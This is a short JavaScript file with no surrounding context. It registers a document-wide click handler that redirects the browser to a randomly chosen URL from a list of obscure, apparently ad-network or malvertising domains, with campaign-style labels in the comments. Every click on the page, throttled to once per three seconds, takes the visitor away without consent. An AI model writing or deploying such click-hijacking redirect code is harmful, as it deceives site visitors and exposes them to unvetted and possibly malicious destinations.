function init() {
  var arr = [
    // hil: db (ss)
    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    // "https://www.qrcreate.online",
    // hil: db (s1)
    "https://grim-package.com/b/3.Ve0JPk3rpFvWbFmGVxJgZEDB0C1zNATsAe2ZMCDQMx2JLaTzU/1/MXDQYzwpM_zWco",

    // hil: db123 (mm)
    "https://classic-bonus.com/bM3.VL0pPb3xpXvibQmQV/JPZrDs0a1YMezmcky-MAz/AsyDLsTuUlzwN/znIkzwMUDwMR",
    // hil: db123 (mm2)
    "https://classic-bonus.com/b.3_Vq0/PO3VpHvkb/m_VbJxZ/D-0Q1uNhTsAI1oMCTFYCyaLFTtUt1gMwDoUCx/NqjaMD",

    // hil: Brian
    "https://aggravatingoil.com/b.3eVq0HPG3RpNvAbYmqVqJjZ/DO0i1/NDT/AY1AMXzbciwVL_T/U-1TMpDqUQzMNLzmEj",

    // mon: db
    "https://nutchaungong.com/4/7420689",
    "https://maipheeg.com/4/7474716",
    "https://glocheexi.com/4/7237941",
    // "https://coawoaph.net/4/7237942",
    // "https://laichegloavy.com/4/7631332",

    // "https://vorsoutseemt.com/4/7436813",
    // "https://eedootefaug.net/4/7420698",
    // "https://futseerdoa.com/4/7237921",
    // "https://eeboazurg.net/4/7420696",
    // "https://psauwaun.com/4/7614690",
    // "https://ptougeegnep.net/4/7237907",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();